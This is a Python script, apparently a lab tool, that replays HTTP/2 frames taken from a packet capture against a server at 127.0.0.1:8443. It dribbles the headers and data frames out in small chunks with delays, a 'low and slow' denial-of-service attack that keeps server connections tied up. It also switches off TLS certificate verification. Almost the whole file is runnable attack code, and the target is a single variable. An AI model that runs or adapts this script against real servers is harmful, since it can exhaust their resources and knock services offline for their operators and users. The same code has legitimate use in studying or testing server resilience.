import ssl
import socket
from scapy.all import rdpcap
import time
from scapy.packet import Raw

# Load the pre-recorded PCAP file
pcap_file = "curl_wwwgoogle.pcap"  # Replace with the actual path to your PCAP file
packets = rdpcap(pcap_file)

# Extract necessary parts of the HTTP/2 payload
preface = packets[3][Raw].load
settings = packets[4][Raw].load
headers = packets[6][Raw].load
data_frame = packets[8][Raw].load

# Target information
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8443

# Function to send the payload with delays
def send_low_and_slow_attack():
    # Create a socket and wrap it for SSL with HTTP/2 ALPN
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context()
    context.check_hostname = False  # Disable hostname checking
    context.verify_mode = ssl.CERT_NONE  # Disable certificate verification
    context.set_alpn_protocols(["h2"])
    wrapped_socket = context.wrap_socket(sock, server_hostname=TARGET_HOST)

    try:
        # Connect to the server
        wrapped_socket.connect((TARGET_HOST, TARGET_PORT))
        print(f"Connected to {TARGET_HOST}:{TARGET_PORT}")

        # Send HTTP/2 preface (mandatory for all HTTP/2 connections)
        wrapped_socket.send(preface)
        print("Sent HTTP/2 preface")

        # Send HTTP/2 settings frame
        wrapped_socket.send(settings)
        print("Sent HTTP/2 settings frame")

        # Slowly send HTTP/2 headers frame
        for i in range(0, len(headers), 10):  # Send 10-byte chunks
            wrapped_socket.send(headers[i:i+10])
            print(f"Sent headers chunk {i // 10 + 1}")
            time.sleep(2)  # Delay to simulate "low and slow"

        # Slowly send HTTP/2 data frame
        for i in range(0, len(data_frame), 10):  # Send 10-byte chunks
            wrapped_socket.send(data_frame[i:i+10])
            print(f"Sent data chunk {i // 10 + 1}")
            time.sleep(2)  # Delay to simulate "low and slow")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        wrapped_socket.close()
        print("Connection closed")

# Run the attack
if __name__ == "__main__":
    send_low_and_slow_attack()
